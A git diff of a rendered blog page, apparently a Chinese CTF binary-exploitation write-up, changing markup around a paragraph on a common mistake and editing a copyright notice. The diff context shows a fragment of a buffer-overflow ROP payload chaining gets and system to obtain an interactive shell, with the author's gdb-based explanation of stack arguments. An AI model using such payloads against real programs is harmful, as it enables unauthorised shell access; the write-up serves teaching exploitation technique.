@@ -497,7 +497,7 @@ payload = &quot;A&quot;*112 + p32(gets_plt) + p32(system_addr) + p32(bss_addr) +
 
 sh.sendline(payload)
 
-sh.interactive()</code></pre><h3 id="易错点"><a href="#易错点" class="headerlink" title="易错点"></a>易错点</h3><p>之前我一直认为这个payload=payload = “A”<em>112 + p32(gets_plt) + p32(system_addr) + p32(bss_addr) + p32(system_ret) + p32(bss_addr)是完全没问题的，system_ret即将作为system函数的返回地址。<br>我这么认为是因为，我以为用p32(gets_plt）执行后p32(system_addr)作为返回地址，p32(bss_addr)作为参数：程序将跳转到system函数，<del>而p32(bss_addr)将被gets函数从栈中取出</del> .*</em>后面这个想法大错特错，用gdb调试发现返回地址，和参数一直都在栈中，只是利用参数时会进行值的传递，而不是取出。**<br><img src="https://s1.ax1x.com/2020/07/06/UCWhEq.png" alt="函数调用过程"></p>
+sh.interactive()</code></pre><h3 id="易错点"><a href="#易错点" class="headerlink" title="易错点"></a>易错点</h3><p>之前我一直认为这个payload=payload = “A”<em>112 + p32(gets_plt) + p32(system_addr) + p32(bss_addr) + p32(system_ret) + p32(bss_addr)是完全没问题的，system_ret即将作为system函数的返回地址。<br>我这么认为是因为，我以为用p32(gets_plt）执行后p32(system_addr)作为返回地址，p32(bss_addr)作为参数：程序将跳转到system函数，<del>而p32(bss_addr)将被gets函数从栈中取出</del><br>**</em>后面这个想法大错特错，用gdb调试发现返回地址，和参数一直都在栈中，只是利用参数时会进行值的传递，而不是取出。**<br><img src="https://s1.ax1x.com/2020/07/06/UCWhEq.png" alt="函数调用过程"></p>
 
             </div>
             <hr/>
@@ -780,7 +780,7 @@ sh.interactive()</code></pre><h3 id="易错点"><a href="#易错点" class="head
             + '来源: Matrix<br />'
             + '作者: IT YUAN<br />'
             + '链接: <a href="' + url + '">' + url + '</a><br />'
-            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+            + '本文章著作权归作者Matrix所有，任何形式的转载都请注明出处：https://squarepants0.github.io/。';
 
         selection.selectAllChildren(newdiv);
         window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
